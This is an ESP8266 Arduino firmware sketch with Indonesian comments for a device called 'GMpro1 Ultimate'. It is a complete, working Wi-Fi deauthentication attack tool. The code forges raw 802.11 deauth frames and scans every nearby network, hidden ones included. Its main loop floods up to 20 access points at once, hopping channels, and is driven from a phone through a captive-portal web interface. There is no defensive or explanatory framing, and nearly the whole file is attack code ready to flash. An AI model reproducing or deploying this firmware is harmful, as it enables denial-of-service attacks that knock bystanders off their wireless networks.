#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include "SSD1306Wire.h"

// Memasukkan fungsi internal ESP8266 untuk kirim paket raw (Deauth)
extern "C" {
  #include "user_interface.h"
}

// Inisialisasi OLED (SDA=D2, SCL=D1)
SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48);

DNSServer dnsServer;
ESP8266WebServer server(80);

// Variabel Global
String _logs = "[SYSTEM] GMpro1 Ultimate Ready\n";
bool isAttacking = false;
String attackType = "IDLE";
int targetCount = 0;

struct Target {
  uint8_t bssid[6];
  int ch;
  String ssid;
};
Target targets[20]; // Menampung hingga 20 WiFi sekitar

// Fungsi mencatat log ke sistem
void addLog(String msg) {
  _logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _logs;
  if(_logs.length() > 800) _logs = _logs.substring(0, 800); // Batasi memori
}

// Fungsi utama serangan Deauth
void sendDeauth(uint8_t* bssid) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP Target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  for(int i=0; i<6; i++) {
    packet[10+i] = packet[16+i] = bssid[i];
  }
  wifi_send_pkt_freedom(packet, 26, 0);
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  display.init();
  display.flipScreenVertically();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro1", "sangkur87"); // Identitas Alat
  
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  // --- ROUTING API ---
  
  server.on("/get_logs", []() { server.send(200, "text/plain", _logs); });

  server.on("/attack", []() {
    attackType = server.arg("type");
    isAttacking = true;
    
    // Scan mendalam mencari target (termasuk Hidden WiFi)
    int n = WiFi.scanNetworks(false, true); 
    targetCount = 0;
    for (int i = 0; i < n && i < 20; i++) {
      memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
      targets[targetCount].ch = WiFi.channel(i);
      targets[targetCount].ssid = (WiFi.SSID(i) == "") ? "*HIDDEN*" : WiFi.SSID(i);
      targetCount++;
    }
    
    addLog("START: " + attackType + " pada " + String(targetCount) + " Target");
    server.send(200, "text/plain", "OK");
  });

  server.on("/stop", []() {
    isAttacking = false;
    attackType = "IDLE";
    addLog("SYSTEM: Serangan Dihentikan");
    server.send(200, "text/plain", "Stopped");
  });

  server.on("/scan", []() {
    int n = WiFi.scanComplete();
    if(n == -2) {
       WiFi.scanNetworks(true, true); // Scan hidden=true
       server.send(200, "application/json", "[]");
    } else {
       String json = "[";
       for (int i = 0; i < n; i++) {
         String name = (WiFi.SSID(i) == "") ? "*HIDDEN*" : WiFi.SSID(i);
         json += "{\"ssid\":\""+name+"\",\"ch\":"+String(WiFi.channel(i))+",\"sig\":"+String(WiFi.RSSI(i))+"}";
         if(i < n-1) json += ",";
       }
       json += "]";
       WiFi.scanNetworks(true, true); 
       server.send(200, "application/json", json);
    }
  });

  // Handler Captive Portal & UI
  server.onNotFound([]() {
    File f = LittleFS.open("/index.html", "r");
    if(f) {
      server.streamFile(f, "text/html");
      f.close();
    } else {
      server.send(200, "text/plain", "File HTML Belum di Upload!");
    }
  });

  server.begin();
  addLog("GMpro1 Ultimate Online");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  // Logika Serangan Deauth
  if (isAttacking) {
    if (attackType == "mass_deauth" || attackType == "deauth") {
      for(int i=0; i<targetCount; i++) {
        wifi_set_channel(targets[i].ch);
        sendDeauth(targets[i].bssid);
        yield(); // Menjaga agar koneksi ke HP kontrol tidak putus
      }
    }
  }

  // Update Tampilan OLED (Setiap 500ms)
  static unsigned long lastOled = 0;
  if(millis() - lastOled > 500) {
    display.clear();
    display.setFont(ArialMT_Plain_10);
    display.drawString(0,0, "GMpro1 ULTIMATE");
    display.drawLine(0, 11, 64, 11);
    display.drawString(0,15, isAttacking ? "ATTACKING..." : "STANDBY");
    display.drawString(0,28, "TYPE: " + attackType);
    display.drawString(0,38, "TGT: " + String(targetCount));
    display.display();
    lastOled = millis();
  }
}
